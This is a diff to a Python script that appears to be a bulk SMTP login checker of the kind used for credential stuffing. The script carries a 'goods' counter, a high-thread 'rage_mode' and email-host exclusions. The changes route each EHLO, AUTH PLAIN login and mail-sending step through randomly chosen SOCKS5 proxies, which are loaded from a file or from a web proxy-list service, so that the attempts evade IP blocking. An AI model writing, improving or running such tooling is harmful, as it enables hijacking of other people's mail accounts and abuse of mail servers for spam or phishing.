@@ -105,7 +105,7 @@ def check_ipv4():
 
 def check_ipv6():
 	try:
-		socket.has_ipv6 = read('https://api6.ipify.org', timeout=3)
+		socket.has_ipv6 = read('https://api6.ipify.org', timeout=5)
 	except:
 		socket.has_ipv6 = False
 
@@ -175,23 +175,41 @@ def is_listening(ip, port):
         # Reset the socket modification to not use the proxy
         socks.setdefaultproxy()  # Clear proxy settings
         socket.socket = socket._socket.socket  # Reset to original socket class
+class SocksProxyContext:
+    def __init__(self, proxy_list):
+        self.original_socket = socket.socket
+        self.proxy_list = proxy_list
+
+    def __enter__(self):
+        if self.proxy_list:
+            proxy = random.choice(self.proxy_list)
+            proxy_host, proxy_port = proxy.split(':')
+            socks.set_default_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
+            socket.socket = socks.socksocket
+        return self
+
+    def __exit__(self, exc_type, exc_value, traceback):
+        socket.socket = self.original_socket
+        socks.set_default_proxy()  # Reset proxy settings
 
 def get_rand_ip_of_host(host):
-	global resolver_obj
+	global proxy_list
+	resolver_obj = dns.resolver.Resolver()
 	try:
-		host = resolver_obj.resolve(host, 'cname')[0].target
-	except:
-		pass
-	try:
-		ip_array = resolver_obj.resolve(host, socket.has_ipv6 and 'aaaa' or 'a')
-	except:
-		try:
-			ip_array = resolver_obj.resolve(host, 'a')
-		except:
-			raise Exception('No A record found for '+host)
-	ip = str(random.choice(ip_array))
-	debug('get ip: '+ip)
-	return ip
+		with SocksProxyContext(proxy_list):
+			try:
+				answer = resolver_obj.resolve(host, 'CNAME')
+				host = str(answer[0].target)
+			except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
+				pass  # If no CNAME is found, continue with the original host
+
+			record_type = 'AAAA' if socket.has_ipv6 else 'A'
+			ip_addresses = resolver_obj.resolve(host, record_type)
+			chosen_ip = str(random.choice(ip_addresses))
+			print(f'get ip: {chosen_ip}')
+			return chosen_ip
+	except Exception as e:
+		raise Exception(f'No A record found for {host}: {str(e)}')
 
 def get_alive_neighbor(ip, port):
 	if ':' in str(ip):
@@ -261,13 +279,26 @@ def is_ignored_host(mail):
 	global exclude_mail_hosts
 	return len([ignored_str for ignored_str in exclude_mail_hosts.split(',') if ignored_str in mail.split('@')[-1]])>0
 
+def set_random_proxy():
+    if proxy_list:
+        proxy = random.choice(proxy_list)
+        proxy_host, proxy_port = proxy.split(':')
+        socks.set_default_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
+        socket.socket = socks.socksocket
+    else:
+        raise ValueError("Proxy list is empty")
+
+
 def socket_send_and_read(sock, cmd=''):
-	if cmd:
-		debug('>>> '+cmd)
-		sock.send((cmd.strip()+'\r\n').encode('ascii'))
-	scream = sock.recv(2**10).decode('ascii').strip()
-	debug('<<< '+scream)
-	return scream
+	try:
+		sock.settimeout(15)
+		if cmd:
+			sock.sendall(cmd.encode() + b'\r\n')
+		response = sock.recv(4096).decode()
+		return response
+	except Exception as e:
+		print(f"Error during send/read: {str(e)}")
+		return ""
 
 def socket_get_free_smtp_server(smtp_server, port):
     port = int(port)
@@ -277,14 +308,13 @@ def socket_get_free_smtp_server(smtp_server, port):
     proxy = random.choice(proxy_list) if proxy_list else None
     if proxy:
         proxy_host, proxy_port = proxy.split(':')
-        print(f"Using proxy: {proxy_host}:{proxy_port}")
         socks.set_default_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
         sock_proxy = socks.socksocket()  # Create a new SOCKS proxy socket
     else:
         socket_type = socket.AF_INET6 if ':' in smtp_server_ip else socket.AF_INET
         sock_proxy = socket.socket(socket_type, socket.SOCK_STREAM)
 
-    sock_proxy.settimeout(5)
+    sock_proxy.settimeout(10)
 
     # SSL context creation for secure connections
     if port == 465:
@@ -302,46 +332,63 @@ def socket_get_free_smtp_server(smtp_server, port):
     return s
 
 def socket_try_tls(sock, self_host):
-	answer = socket_send_and_read(sock, 'EHLO '+self_host)
-	if re.findall(r'starttls', answer.lower()):
-		answer = socket_send_and_read(sock, 'STARTTLS')
-		if answer[:3] == '220':
-			sock = ssl._create_unverified_context().wrap_socket(sock)
-	return sock
+    set_random_proxy()  # Set a random proxy before the connection
+    answer = socket_send_and_read(sock, f'EHLO {self_host}')
+    if 'starttls' in answer.lower():
+        answer = socket_send_and_read(sock, 'STARTTLS')
+        if answer.startswith('220'):
+            context = ssl.create_default_context()
+            sock = context.wrap_socket(sock, server_hostname=self_host)
+    return sock
 
 def socket_try_login(sock, self_host, smtp_login, smtp_password):
-	smtp_login_b64 = base64_encode(smtp_login)
-	smtp_pass_b64 = base64_encode(smtp_password)
-	smtp_login_pass_b64 = base64_encode(smtp_login+':'+smtp_password)
-	answer = socket_send_and_read(sock, 'EHLO '+self_host)
-	if re.findall(r'auth[\w =-]+(plain|login)', answer.lower()):
-		if re.findall(r'auth[\w =-]+login', answer.lower()):
-			answer = socket_send_and_read(sock, 'AUTH LOGIN '+smtp_login_b64)
-			if answer[:3] == '334':
-				try:
-					answer = socket_send_and_read(sock, smtp_pass_b64)
-				except:
-					raise Exception('wrong password, connection closed')
-		elif re.findall(r'auth[\w =-]+plain', answer.lower()):
-			answer = socket_send_and_read(sock, 'AUTH PLAIN '+smtp_login_pass_b64)
-		if answer[:3] == '235' and 'succ' in answer.lower():
-			return sock
-	raise Exception(answer)
+    set_random_proxy()  # Set a random proxy before attempting login
+    answer = socket_send_and_read(sock, f'EHLO {self_host}')
+    if 'auth' in answer.lower():
+        credentials = f"{smtp_login}\0{smtp_login}\0{smtp_password}"
+        answer = socket_send_and_read(sock, f'AUTH PLAIN {base64.b64encode(credentials.encode()).decode()}')
+        if '235' in answer:
+            return sock
+    raise Exception(f"Login failed: {answer}")
+
 
 def socket_try_mail(sock, smtp_from, smtp_to, data):
-	answer = socket_send_and_read(sock, f'MAIL FROM: <{smtp_from}>')
-	if answer[:3] == '250':
-		answer = socket_send_and_read(sock, f'RCPT TO: <{smtp_to}>')
-		if answer[:3] == '250':
-			answer = socket_send_and_read(sock, 'DATA')
-			if answer[:3] == '354':
-				answer = socket_send_and_read(sock, data)
-				if answer[:3] == '250':
-					socket_send_and_read(sock, 'QUIT')
-					sock.close()
-					return True
-	sock.close()
-	raise Exception(answer)
+    set_random_proxy()  # Ensure the socket is using a random proxy
+    try:
+        answer = socket_send_and_read(sock, f'MAIL FROM: <{smtp_from}>')
+        if answer.startswith('250'):
+            answer = socket_send_and_read(sock, f'RCPT TO: <{smtp_to}>')
+            if answer.startswith('250'):
+                answer = socket_send_and_read(sock, 'DATA')
+                if answer.startswith('354'):
+                    answer = socket_send_and_read(sock, data + '\r\n.')  # Ensure to end data with '\r\n.'
+                    if answer.startswith('250'):
+                        socket_send_and_read(sock, 'QUIT')
+                        return True
+        raise Exception("SMTP command failed: " + answer)
+    finally:
+        sock.close()
+
+def load_proxies():
+    global proxy_list
+    choice = input('Load proxy from file or net: (1/2) ')
+    if choice == '1':
+        try:
+            with open('2.txt', 'r') as file:
+                proxy_list = [line.strip() for line in file if line.strip()]
+                print('Proxies loaded:', len(proxy_list))
+        except FileNotFoundError:
+            print('Proxy file not found.')
+            sys.exit(1)
+    else:
+        try:
+            response = requests.get('https://arachnet.cloud/socks?type=list', timeout=10)
+            response.raise_for_status()  # Raises a HTTPError for bad responses
+            proxy_list = [line.strip() for line in response.text.split('\n') if line.strip()]
+            print('Proxies loaded from web:', len(proxy_list))
+        except requests.RequestException as e:
+            print(f"Failed to load proxies from the web: {str(e)}")
+            sys.exit(1)
 
 def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
 	global verify_email
@@ -439,15 +486,6 @@ def requests_get(url, **kwargs):
         print(f"Failed to make a request to {url} using {proxies}: {str(e)}")
         return None
 	
-def load_proxies():
-    global proxy_list
-    try:
-        with open('2.txt', 'r') as file:
-            proxy_list = [line.strip() for line in file if line.strip()]
-            print('Proxies loaded:', len(proxy_list))
-    except FileNotFoundError:
-        print('Proxy file not found.')
-        sys.exit(1)
 	
 def worker_item(jobs_que, results_que, proxies):
     global min_threads, threads_counter, verify_email, goods, smtp_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
@@ -565,6 +603,7 @@ try:
 except Exception as e:
 	exit(err+red(e))
 
+
 jobs_que = queue.Queue()
 results_que = queue.Queue()
 ignored = 0
@@ -572,7 +611,7 @@ goods = 0
 mem_usage = 0
 cpu_usage = 0
 net_usage = 0
-min_threads = 100
+min_threads = int(input("Enter min. threads: "))
 max_threads = debuglevel or rage_mode and 600 or 100
 threads_counter = 0
 no_jobs_left = False
